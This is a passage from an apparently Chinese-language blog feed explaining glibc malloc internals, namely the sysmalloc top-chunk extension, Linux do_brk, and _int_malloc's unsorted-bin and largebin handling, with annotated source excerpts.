class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div></pre></td><td class="code"><pre><div class="line">static unsigned long do_brk(unsigned long addr, unsigned long len)&#123;</div><div class="line"></div><div class="line">    struct mm_struct *mm = current-&gt;mm;</div><div class="line">    struct vm_area_struct *vma, *prev;</div><div class="line">    unsigned long flags;</div><div class="line">    struct rb_node **rb_link, *rb_parent;</div><div class="line">    pgoff_t pgoff = addr &gt;&gt; PAGE_SHIFT;</div><div class="line">    int error;</div><div class="line"></div><div class="line">    len = PAGE_ALIGN(len);</div><div class="line">    if (!len)</div><div class="line">        return addr;</div><div class="line"></div><div class="line">    flags = VM_DATA_DEFAULT_FLAGS | VM_ACCOUNT | mm-&gt;def_flags;</div><div class="line"></div><div class="line">    error = get_unmapped_area(NULL, addr, len, 0, MAP_FIXED);</div><div class="line">    if (error &amp; ~PAGE_MASK)</div><div class="line">        return error;</div><div class="line"></div><div class="line">    error = mlock_future_check(mm, mm-&gt;def_flags, len);</div><div class="line">    if (error)</div><div class="line">        return error;</div><div class="line"></div><div class="line">    verify_mm_writelocked(mm);</div><div class="line"></div><div class="line">    while (find_vma_links(mm, addr, addr + len, &amp;prev, &amp;rb_link,</div><div class="line">                  &amp;rb_parent)) &#123;</div><div class="line">        if (do_munmap(mm, addr, len))</div><div class="line">            return -ENOMEM;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    if (!may_expand_vm(mm, len &gt;&gt; PAGE_SHIFT))</div><div class="line">        return -ENOMEM;</div><div class="line"></div><div class="line">    if (mm-&gt;map_count &gt; sysctl_max_map_count)</div><div class="line">        return -ENOMEM;</div><div class="line"></div><div class="line">    if (security_vm_enough_memory_mm(mm, len &gt;&gt; PAGE_SHIFT))</div><div class="line">        return -ENOMEM;</div><div class="line"></div><div class="line">    vma = vma_merge(mm, prev, addr, addr + len, flags,</div><div class="line">                    NULL, NULL, pgoff, NULL);</div><div class="line">    if (vma)</div><div class="line">        goto out;</div><div class="line"></div><div class="line">    vma = kmem_cache_zalloc(vm_area_cachep, GFP_KERNEL);</div><div class="line">    if (!vma) &#123;</div><div class="line">        vm_unacct_memory(len &gt;&gt; PAGE_SHIFT);</div><div class="line">        return -ENOMEM;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    INIT_LIST_HEAD(&amp;vma-&gt;anon_vma_chain);</div><div class="line">    vma-&gt;vm_mm = mm;</div><div class="line">    vma-&gt;vm_start = addr;</div><div class="line">    vma-&gt;vm_end = addr + len;</div><div class="line">    vma-&gt;vm_pgoff = pgoff;</div><div class="line">    vma-&gt;vm_flags = flags;</div><div class="line">    vma-&gt;vm_page_prot = vm_get_page_prot(flags);</div><div class="line">    vma_link(mm, vma, prev, rb_link, rb_parent);</div><div class="line">out:</div><div class="line">    perf_event_mmap(vma);</div><div class="line">    mm-&gt;total_vm += len &gt;&gt; PAGE_SHIFT;</div><div class="line">    if (flags &amp; VM_LOCKED)</div><div class="line">        mm-&gt;locked_vm += (len &gt;&gt; PAGE_SHIFT);</div><div class="line">    vma-&gt;vm_flags |= VM_SOFTDIRTY;</div><div class="line">    return addr;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这段代码和第二章中分析的<code>mmap_region</code>函数很类似，这里简单分析如下，<code>get_unmapped_area</code>用来检查需要分配的虚拟内存地址是否已经被使用，<code>find_vma_links</code>用来查找需要插入的虚拟内存在红黑树的位置，<code>may_expand_vm</code>用来检查虚拟内存是否会超过系统的限制，<code>vma_merge</code>用来合并虚拟内存，如果不能合并，就通过slab分配一个<code>vma</code>，进行相应的设置，并通过<code>vma_link</code>插入到进程的红黑树中。</p>
<p>从linux的代码中回来，继续看<code>sysmalloc</code>，假设分配成功，会查找是否有<code>__after_morecore_hook</code>函数并执行，这里假设该函数指针为null。<br>假设分配失败，则进入<code>else</code>部分，首先对需要分配的大小按地址对齐，并且设置分配<code>size</code>的最小值为<code>MMAP_AS_MORECORE_SIZE</code>（1MB），然后通过<code>MMAP</code>宏分配内存，该函数已经在《malloc源码分析—2》分析过了。这里注意，如果是通过mmap分配的内存，则设置分配区为不连续标志位。</p>
<h2 id="第三部分"><a href="#第三部分" class="headerlink" title="第三部分"></a>第三部分</h2><p>继续往下看sysmalloc，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div></pre></td><td class="code"><pre><div class="line">static void * sysmalloc(INTERNAL_SIZE_T nb, mstate av) &#123;</div><div class="line"></div><div class="line">    ...</div><div class="line"></div><div class="line">    if (av != &amp;main_arena) &#123;</div><div class="line"></div><div class="line">        ...</div><div class="line"></div><div class="line">    &#125;</div><div class="line">    else&#123;</div><div class="line"></div><div class="line">        ...</div><div class="line"></div><div class="line">        if (brk != (char *) (MORECORE_FAILURE)) &#123;</div><div class="line">            if (mp_.sbrk_base == 0)</div><div class="line">                mp_.sbrk_base = brk;</div><div class="line">            av-&gt;system_mem += size;</div><div class="line"></div><div class="line">            if (brk == old_end &amp;&amp; snd_brk == (char *) (MORECORE_FAILURE))</div><div class="line">                set_head(old_top, (size + old_size) | PREV_INUSE);</div><div class="line">            else if (contiguous (av) &amp;&amp; old_size &amp;&amp; brk &lt; old_end) &#123;</div><div class="line">                malloc_printerr(3, &quot;break adjusted to free malloc space&quot;, brk, av);</div><div class="line">            &#125;</div><div class="line">            else &#123;</div><div class="line">                front_misalign = 0;</div><div class="line">                end_misalign = 0;</div><div class="line">                correction = 0;</div><div class="line">                aligned_brk = brk;</div><div class="line"></div><div class="line">                if (contiguous(av)) &#123;</div><div class="line">                    if (old_size)</div><div class="line">                        av-&gt;system_mem += brk - old_end;</div><div class="line"></div><div class="line">                    front_misalign = (INTERNAL_SIZE_T) chunk2mem(</div><div class="line">                            brk) &amp; MALLOC_ALIGN_MASK;</div><div class="line">                    if (front_misalign &gt; 0) &#123;</div><div class="line">                        correction = MALLOC_ALIGNMENT - front_misalign;</div><div class="line">                        aligned_brk += correction;</div><div class="line">                    &#125;</div><div class="line"></div><div class="line">                    correction += old_size;</div><div class="line">                    end_misalign = (INTERNAL_SIZE_T) (brk + size + correction);</div><div class="line">                    correction += (ALIGN_UP(end_misalign, pagesize)) - end_misalign;</div><div class="line"></div><div class="line">                    assert(correction &gt;= 0);</div><div class="line">                    snd_brk = (char *) (MORECORE(correction));</div><div class="line"></div><div class="line">                    if (snd_brk == (char *) (MORECORE_FAILURE)) &#123;</div><div class="line">                        correction = 0;</div><div class="line">                        snd_brk = (char *) (MORECORE(0));</div><div class="line">                    &#125; else &#123;</div><div class="line">                        void (*hook)(</div><div class="line">                        void) = atomic_forced_read (__after_morecore_hook);</div><div class="line">                        if (__builtin_expect (hook != NULL, 0))</div><div class="line">                        (*hook)();</div><div class="line">                    &#125;</div><div class="line">                &#125;</div><div class="line"></div><div class="line">                ...</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    ...</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>假设增加了主分配区的top chunk成功，则更新<code>sbrk_base</code>和分配区已分配的内存大小。<br>然后，第一个判断表示，新分配的内存地址和原来的<code>top chunk</code>连续，并且不是通过<code>MMAP</code>分配的，这时只需要更新原来top chunk的大小<code>size</code>。<br>第二个判断表示如果分配区的连续标志位置位，top chunk的大小大于0，但是分配的<code>brk</code>小于原来的top chunk结束地址，这里就判定出错了。<br>进入第三个判断表示新分配的内存地址大于原来的top chunk的结束地址，但是不连续。这种情况下，如果分配区的连续标志位置位，则表示不是通过MMAP分配的，肯定有其他线程调用了<code>brk</code>在堆上分配了内存，<code>av-&gt;system_mem += brk - old_end</code>表示将其他线程分配的内存一并计入到该分配区分配的内存大小。然后将刚刚分配的地址<code>brk</code>按<code>MALLOC_ALIGNMENT</code>对齐。<br>再往下就要处理地址不连续的问题了，因为地址不连续，就要放弃原来top chunk后面一部分的内存大小，并且将这一部分内存大小“补上”到刚刚分配的新内存后面。首先计算堆上补上内存后的结束地址并保存在<code>correction</code>中，然后调用<code>MORECORE</code>继续分配一次，将新分配内存的开始地址保存在<code>snd_brk</code>中。如果分配失败，则将<code>correction</code>设为0，并将<code>snd_brk</code>重置为原来分配的内存的结束地址，表示放弃该次补偿操作；如果分配成功，就调用<code>__after_morecore_hook</code>函数，这里假设该函数指针为<code>null</code>。</p>
<h2 id="第四部分"><a href="#第四部分" class="headerlink" title="第四部分"></a>第四部分</h2><p>继续往下看sysmalloc，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div></pre></td><td class="code"><pre><div class="line">static void * sysmalloc(INTERNAL_SIZE_T nb, mstate av) &#123;</div><div class="line"></div><div class="line">    ...</div><div class="line"></div><div class="line">    if (av != &amp;main_arena) &#123;</div><div class="line"></div><div class="line">        ...</div><div class="line"></div><div class="line">    &#125;</div><div class="line">    else&#123;</div><div class="line"></div><div class="line">        ...</div><div class="line"></div><div class="line">        if (brk != (char *) (MORECORE_FAILURE)) &#123;</div><div class="line"></div><div class="line">            ...</div><div class="line"></div><div class="line">            if (brk == old_end &amp;&amp; snd_brk == (char *) (MORECORE_FAILURE))</div><div class="line">                ...</div><div class="line">            else if (contiguous (av) &amp;&amp; old_size &amp;&amp; brk &lt; old_end) &#123;</div><div class="line">                ...</div><div class="line">            &#125;</div><div class="line">            else &#123;</div><div class="line"></div><div class="line">                ...</div><div class="line"></div><div class="line">                if (contiguous(av)) &#123;</div><div class="line"></div><div class="line">                    ...</div><div class="line"></div><div class="line">                &#125;</div><div class="line"></div><div class="line">                else&#123;</div><div class="line">                    if (MALLOC_ALIGNMENT == 2 * SIZE_SZ)</div><div class="line">                    assert (((unsigned long) chunk2mem (brk) &amp; MALLOC_ALIGN_MASK) == 0);</div><div class="line">                    else&#123;</div><div class="line">                        front_misalign = (INTERNAL_SIZE_T) chunk2mem (brk) &amp; MALLOC_ALIGN_MASK;</div><div class="line">                        if (front_misalign &gt; 0)&#123;</div><div class="line">                            aligned_brk += MALLOC_ALIGNMENT - front_misalign;</div><div class="line">                        &#125;</div><div class="line">                    &#125;</div><div class="line"></div><div class="line">                    if (snd_brk == (char *) (MORECORE_FAILURE))&#123;</div><div class="line">                        snd_brk = (char *) (MORECORE (0));</div><div class="line">                    &#125;</div><div class="line">                &#125;</div><div class="line"></div><div class="line">                if (snd_brk != (char *) (MORECORE_FAILURE)) &#123;</div><div class="line">                    av-&gt;top = (mchunkptr) aligned_brk;</div><div class="line">                    set_head(av-&gt;top,</div><div class="line">                            (snd_brk - aligned_brk + correction) | PREV_INUSE);</div><div class="line">                    av-&gt;system_mem += correction;</div><div class="line"></div><div class="line">                    if (old_size != 0) &#123;</div><div class="line">                        old_size = (old_size - 4 * SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK;</div><div class="line">                        set_head(old_top, old_size | PREV_INUSE);</div><div class="line"></div><div class="line">                        chunk_at_offset (old_top, old_size)-&gt;size = (2 * SIZE_SZ)</div><div class="line">                                | PREV_INUSE;</div><div class="line"></div><div class="line">                        chunk_at_offset (old_top, old_size + 2 * SIZE_SZ)-&gt;size = (2</div><div class="line">                                * SIZE_SZ) | PREV_INUSE;</div><div class="line"></div><div class="line">                        if (old_size &gt;= MINSIZE) &#123;</div><div class="line">                            _int_free(av, old_top, 1);</div><div class="line">                        &#125;</div><div class="line">                    &#125;</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    ...</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>开头的<code>else</code>表示分配区的连续标志没有置位，这时只要按照<code>MALLOC_ALIGNMENT</code>做简单的对齐就行了，如果是通过<code>brk</code>分配的内存，则通过<code>MORECORE (0)</code>得到新分配的内存的结束地址并保存在<code>snd_brk</code>中。<br>再往下进入<code>if</code>，设置分配区的top指针为经过对齐之后的起始地址<code>aligned_brk</code>，设置top chunk的大小<code>size</code>，<code>aligned_brk</code>表示对齐造成的误差，<code>correction</code>是因为要补偿原来top chunk剩余内存造成的误差，然后设置分配区已分配的内存大小。<br>因为不连续，最后<code>if</code>内是设置原top chunk的<code>fencepost</code>，将原来top chunk的剩余空间拆成两个<code>SIZE_SZ*2</code>大小的chunk，如果剩下的大小大于可分配的chunk的最小值<code>MINSIZE</code>，就通过<code>_int_free</code>释放掉整个剩余内存。</p>
<h2 id="第五部分"><a href="#第五部分" class="headerlink" title="第五部分"></a>第五部分</h2><p>继续往下看sysmalloc最后一部分，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">static void * sysmalloc(INTERNAL_SIZE_T nb, mstate av) &#123;</div><div class="line"></div><div class="line">    ...</div><div class="line"></div><div class="line">    if ((unsigned long) av-&gt;system_mem &gt; (unsigned long) (av-&gt;max_system_mem))</div><div class="line">        av-&gt;max_system_mem = av-&gt;system_mem;</div><div class="line">    check_malloc_state (av);</div><div class="line"></div><div class="line">    p = av-&gt;top;</div><div class="line">    size = chunksize(p);</div><div class="line"></div><div class="line">    if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE )) &#123;</div><div class="line">        remainder_size = size - nb;</div><div class="line">        remainder = chunk_at_offset(p, nb);</div><div class="line">        av-&gt;top = remainder;</div><div class="line">        set_head(p, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : 0));</div><div class="line">        set_head(remainder, remainder_size | PREV_INUSE);</div><div class="line">        check_malloced_chunk (av, p, nb);</div><div class="line">        return chunk2mem(p);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    __set_errno(ENOMEM);</div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这里就是获得前面所有代码更新后的top chunk，然后从该top chunk中分配用户需要的大小chunk并返回，如果失败则返回0。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>简单总结一下<code>sysmalloc</code>函数，这里不包含《malloc源码分析—2》中的代码，该代码用于初始化。首先进入<code>sysmalloc</code>函数就表示top chunk的空间不够了。<br>假设当前分配区不是主分配区，就通过<code>grow_heap</code>增加top chunk的空间，如果失败就通过<code>new_heap</code>重新分配一个heap，并将该分配区的top chunk指针指向新分配的heap的空闲内存。<br>如果当前分配区是主分配区，首先会通过<code>brk</code>在堆上分配内存以增加top chunk的空间，如果失败再通过<code>MMAP</code>分配。假设新分配内存的地址不连续，而分配区的连续标志位置位，就会继续分配内存以补偿。<br>最后，只要分配成功，就可以从被更新的top chunk分配所需的内存。</p>
]]></content>
      
        <categories>
            
            <category> pwn </category>
            
        </categories>
        
        
        <tags>
            
            <tag> heap </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[malloc源码分析——4]]></title>
      <url>/2018/05/21/malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E2%80%94%E2%80%944/</url>
      <content type="html"><![CDATA[<h1 id="malloc源码分析—-int-malloc"><a href="#malloc源码分析—-int-malloc" class="headerlink" title="malloc源码分析—_int_malloc"></a>malloc源码分析—_int_malloc</h1><p>上一章分析了<code>_int_malloc</code>中的fastbin、smallbin和部分largebin的处理，本章继续往下看余下的代码。最后会对整个<code>_int_malloc</code>做一个总结。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div></pre></td><td class="code"><pre><div class="line">static void * _int_malloc(mstate av, size_t bytes) &#123;</div><div class="line"></div><div class="line">...</div><div class="line"></div><div class="line">    for (;;) &#123;</div><div class="line">        int iters = 0;</div><div class="line">        while ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))&#123;</div><div class="line">            bck = victim-&gt;bk;</div><div class="line">            if (__builtin_expect(victim-&gt;size &lt;= 2 * SIZE_SZ, 0)</div><div class="line">                    || __builtin_expect(victim-&gt;size &gt; av-&gt;system_mem, 0))</div><div class="line">                malloc_printerr(check_action, &quot;malloc(): memory corruption&quot;,</div><div class="line">                        chunk2mem(victim), av);</div><div class="line">            size = chunksize(victim);</div><div class="line"></div><div class="line">            if (in_smallbin_range (nb) &amp;&amp;</div><div class="line">            bck == unsorted_chunks (av) &amp;&amp;</div><div class="line">            victim == av-&gt;last_remainder &amp;&amp;</div><div class="line">            (unsigned long) (size) &gt; (unsigned long) (nb + MINSIZE)) &#123;</div><div class="line">                remainder_size = size - nb;</div><div class="line">                remainder = chunk_at_offset(victim, nb);</div><div class="line">                unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;</div><div class="line">                av-&gt;last_remainder = remainder;</div><div class="line">                remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);</div><div class="line">                if (!in_smallbin_range(remainder_size)) &#123;</div><div class="line">                    remainder-&gt;fd_nextsize = NULL;</div><div class="line">                    remainder-&gt;bk_nextsize = NULL;</div><div class="line">                &#125;</div><div class="line"></div><div class="line">                set_head(victim,</div><div class="line">                        nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : 0));</div><div class="line">                set_head(remainder, remainder_size | PREV_INUSE);</div><div class="line">                set_foot(remainder, remainder_size);</div><div class="line"></div><div class="line">                check_malloced_chunk (av, victim, nb);</div><div class="line">                void *p = chunk2mem(victim);</div><div class="line">                alloc_perturb(p, bytes);</div><div class="line">                return p;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            unsorted_chunks (av)-&gt;bk = bck;</div><div class="line">            bck-&gt;fd = unsorted_chunks (av);</div><div class="line"></div><div class="line">            if (size == nb) &#123;</div><div class="line">                set_inuse_bit_at_offset(victim, size);</div><div class="line">                if (av != &amp;main_arena)</div><div class="line">                    victim-&gt;size |= NON_MAIN_ARENA;</div><div class="line">                check_malloced_chunk (av, victim, nb);</div><div class="line">                void *p = chunk2mem(victim);</div><div class="line">                alloc_perturb(p, bytes);</div><div class="line">                return p;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            ...</div><div class="line"></div><div class="line">        &#125;</div><div class="line"></div><div class="line">    ...</div><div class="line"></div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这部分代码的整体意思就是遍历unsortedbin，从中查找是否有符合用户要求大小的chunk并返回。<br>第一个while循环从尾到头依次取出unsortedbin中的所有chunk，将该chunk对应的前一个chunk保存在<code>bck</code>中，并将大小保存在<code>size</code>中。<br>如果用户需要分配的内存大小对应的chunk属于smallbin，unsortedbin中只有这一个chunk，并且该chunk属于last remainder chunk且其大小大于用户需要分配内存大小对应的chunk大小加上最小的chunk大小（保证可以拆开成两个chunk），就将该chunk拆开成两个chunk，分别为<code>victim</code>和<code>remainder</code>，进行相应的设置后，将用户需要的<code>victim</code>返回。<br>如果不能拆开，就从unsortedbin中取出该chunk（<code>victim</code>）。<br>再下来，如果刚刚从unsortedbin中取出的<code>victim</code>正好是用户需要的大小<code>nb</code>，就设置相应的标志位，直接返回该<code>victim</code>。</p>
<p>继续往下看<code>_int_malloc</code>函数，为了使整个代码结构清晰，这里保留了外层的for循环和while循环。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div></pre></td><td class="code"><pre><div class="line">static void * _int_malloc(mstate av, size_t bytes) &#123;</div><div class="line"></div><div class="line">    ...</div><div class="line"></div><div class="line">    for (;;) &#123;</div><div class="line">        int iters = 0;</div><div class="line">        while ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))&#123;</div><div class="line"></div><div class="line">            ...</div><div class="line"></div><div class="line">            if (in_smallbin_range(size)) &#123;</div><div class="line">                victim_index = smallbin_index(size);</div><div class="line">                bck = bin_at (av, victim_index);</div><div class="line">                fwd = bck-&gt;fd;</div><div class="line">            &#125; else &#123;</div><div class="line">                victim_index = largebin_index(size);</div><div class="line">                bck = bin_at (av, victim_index);</div><div class="line">                fwd = bck-&gt;fd;</div><div class="line"></div><div class="line">                if (fwd != bck) &#123;</div><div class="line">                    size |= PREV_INUSE;</div><div class="line">                    assert((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == 0);</div><div class="line">                    if ((unsigned long) (size) &lt; (unsigned long) (bck-&gt;bk-&gt;size)) &#123;</div><div class="line">                        fwd = bck;</div><div class="line">                        bck = bck-&gt;bk;</div><div class="line"></div><div class="line">                        victim-&gt;fd_nextsize = fwd-&gt;fd;</div><div class="line">                        victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</div><div class="line">                        fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize =</div><div class="line">                                victim;</div><div class="line">                    &#125; else &#123;</div><div class="line">                        assert((fwd-&gt;size &amp; NON_MAIN_ARENA) == 0);</div><div class="line">                        while ((unsigned long) size &lt; fwd-&gt;size) &#123;</div><div class="line">                            fwd = fwd-&gt;fd_nextsize;</div><div class="line">                            assert((fwd-&gt;size &amp; NON_MAIN_ARENA) == 0);</div><div class="line">                        &#125;</div><div class="line"></div><div class="line">                        if ((unsigned long) size == (unsigned long) fwd-&gt;size)</div><div class="line">                            fwd = fwd-&gt;fd;</div><div class="line">                        else &#123;</div><div class="line">                            victim-&gt;fd_nextsize = fwd;</div><div class="line">                            victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</div><div class="line">                            fwd-&gt;bk_nextsize = victim;</div><div class="line">                            victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</div><div class="line">                        &#125;</div><div class="line">                        bck = fwd-&gt;bk;</div><div class="line">                    &#125;</div><div class="line">                &#125; else</div><div class="line">                    victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            mark_bin(av, victim_index);</div><div class="line">            victim-&gt;bk = bck;</div><div class="line">            victim-&gt;fd = fwd;</div><div class="line">            fwd-&gt;bk = victim;</div><div class="line">            bck-&gt;fd = victim;</div><div class="line"></div><div class="line">    #define MAX_ITERS       10000</div><div class="line">            if (++iters &gt;= MAX_ITERS)</div><div class="line">                break;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">    ...</div><div class="line"></div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这部分代码的整体意思是如果从unsortedbin中取出的chunk不符合用户要求的大小，就将该chunk合并到smallbin或者largebin中。<br>首先如果取出的chunk（victim）属于smallbin，就通过<code>smallbin_index</code>计算需要插入的位置<code>victim_index</code>，然后获取smallbin中对应位置的链表头指针保存在<code>bck</code>中，最后直接插入到smallbin中，由于smallbin中的chunk不使用<code>fd_nextsize</code>和<code>bk_nextsize</code>指针，插入操作只需要更新<code>bk</code>和<code>fd</code>指针，具体的插入操作在后面。这里需解释一下，<code>fd_nextsize</code>指针指向的是chunk双向链表中下一个大小不同的chunk，<code>bk_nextsize</code>指向的是chunk双向链表中前一个大小不同的chunk。<br>如果取出的chunk（victim）属于largebin，通过<code>largebin_index</code>计算需要插入的位置<code>victim_index</code>，然后获取largebin链表头指针保存在<code>bck</code>中。<br>如果<code>fwd</code>等于<code>bck</code>，即<code>bck-&gt;fd=bck</code>，则表示largebin中对应位置上的chunk双向链表为空，直接进入后面的else部分中，代码<code>victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim</code>表示插入到largebin中的victim是唯一的chunk，因此其<code>fd_nextsize</code>和<code>bk_nextsize</code>指针都指向自己。<br>如果<code>fwd</code>不等于<code>bck</code>，对应的chunk双向链表存在空闲chunk，这时就要在该链表中找到合适的位置插入了。因为largebin中的chunk链表是按照chunk大小从大到小排序的，如果<code>victim</code>的<code>size</code>小于<code>bck-&gt;bk-&gt;size</code>即最后一个chunk的大小，则表示即将插入<code>victim</code>的大小在largebin的chunk双向链表中是最小的，因此要把<code>victim</code>插入到该链表的最后。在这种情况下，经过操作后的结果如下所示（因为我手边的画图软件有限，这里就用符号“|”隔出数组，然后从代码中摘除核心的<code>fd_nextsize</code>和<code>bk_nextsize</code>指针的修改操作，对照这两个指针的意思，很容易看懂），</p>
